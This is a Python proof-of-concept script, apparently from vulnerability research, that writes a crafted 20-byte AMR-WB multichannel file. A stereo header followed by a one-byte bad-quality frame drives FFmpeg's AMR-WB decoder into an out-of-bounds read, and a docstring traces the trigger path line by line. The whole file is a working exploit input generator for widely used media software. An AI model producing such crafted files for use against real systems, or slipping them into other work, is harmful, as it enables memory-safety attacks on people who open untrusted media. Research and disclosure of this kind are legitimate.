#!/usr/bin/env python3
"""
PoC generator for vuln_001:
  OOB Read via Missing Buffer-Size Check Before buf Advance in Stereo
  NO_DATA/Bad-Quality Path (amrwb_decode_frame, lines 1140-1152)

Attack:
  A 2-channel (stereo) raw AMR-WB multichannel file whose single audio
  frame payload is exactly 1 byte: 0x40.

Container choice - raw AMR-WB multichannel (.amr):
  FFmpeg's libavformat/amr.c amr_read_header() (lines 105-110) handles
  the magic "#!AMR-WB_MC1.0\\n" and reads channel count from the next
  4 bytes (little-endian):

    AMRWBMC_header = b"#!AMR-WB_MC1.0\\n"  (15 bytes)
    st->codecpar->ch_layout.nb_channels = AV_RL32(header + 15);

  The 3GP/MOV demuxer (libavformat/mov.c lines 3249-3252) unconditionally
  forces AMR_WB to MONO, so that path cannot trigger the stereo loop.

File layout (20 bytes total):
  bytes  0-14  "#!AMR-WB_MC1.0\\n"      -- AMR-WB multichannel magic
  bytes 15-18  \\x02\\x00\\x00\\x00          -- nb_channels = 2 (little-endian)
  byte    19   0x40                     -- crafted AMR-WB frame header

Byte 0x40 breakdown (decode_mime_header, amrwbdec.c lines 158-159):
  bit 7     = 0  (unused padding)
  bits 6:3  = 8  --> fr_cur_mode = MODE_23k85
  bit 2     = 0  --> fr_quality  = 0 (bad/corrupted frame)
  bits 1:0  = 0  (unused padding)

Trigger sequence in amrwb_decode_frame (lines 1125-1152):
  Decoder initialised with nb_channels = 2 (from multichannel header).

  Channel 0 iteration:
    line 1140: decode_mime_header reads buf[0] = 0x40  (valid, offset 0)
    line 1141: expected_fr_size = (cf_sizes_wb[8]+7)>>3 + 1
                                = (477+7)/8 + 1 = 61
    line 1143: fr_quality == 0  --> bad-quality branch
    line 1150: buf      += 61   (NO bounds check before advance!)
    line 1151: buf_size -= 61   (becomes -60)
    line 1152: continue

  Channel 1 iteration:
    line 1140: decode_mime_header reads buf[0] = packet->data[61]
               This is 60 bytes past the end of the 1-byte packet.
               --> OOB read (CWE-125)

  The access lands in the mandatory AV_INPUT_BUFFER_PADDING_SIZE (64-byte)
  region so ASAN does not crash; Valgrind / MSan detect the uninitialised
  read.  The negative buf_size also corrupts subsequent logic.
"""

import struct
import os
import sys

# AMR-WB multichannel magic (libavformat/amr.c line 46)
AMRWBMC_MAGIC = b'#!AMR-WB_MC1.0\n'   # 15 bytes

# Crafted frame byte:
#   bits[6:3] = 8 = MODE_23k85  (cf_sizes_wb[8] = 477 bits -> 61 bytes)
#   bit[2]    = 0               (fr_quality = 0 -> bad frame)
CRAFTED_FRAME = bytes([0x40])


def generate(output_path: str) -> None:
    nb_channels = 2   # stereo: triggers the 2-channel loop in amrwb_decode_frame

    payload = (
        AMRWBMC_MAGIC +                        # 15 bytes magic
        struct.pack('<I', nb_channels) +        # 4 bytes channel count (LE)
        CRAFTED_FRAME                           # 1 byte crafted audio frame
    )

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
    with open(output_path, 'wb') as fh:
        fh.write(payload)

    print(f"[+] Written {len(payload)} bytes -> {output_path}")
    print(f"    magic   : {AMRWBMC_MAGIC!r}")
    print(f"    channels: {nb_channels} (little-endian uint32)")
    print(f"    frame   : {CRAFTED_FRAME.hex()} "
          f"(mode=8/MODE_23k85, quality=0/bad)")
    print()
    print("Trigger path in amrwb_decode_frame:")
    print("  ch=0: decode_mime_header(buf[0]=0x40) -> mode=8, quality=0")
    print("        expected_fr_size = 61")
    print("        bad-quality branch: buf += 61, buf_size = 1-61 = -60")
    print("        (no bounds check before buf advance at line 1150)")
    print("  ch=1: decode_mime_header(buf[0]) reads packet->data[61]")
    print("        -> OOB read, 60 bytes past end of 1-byte packet (CWE-125)")


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'vuln_001_input.amr'
    generate(out)
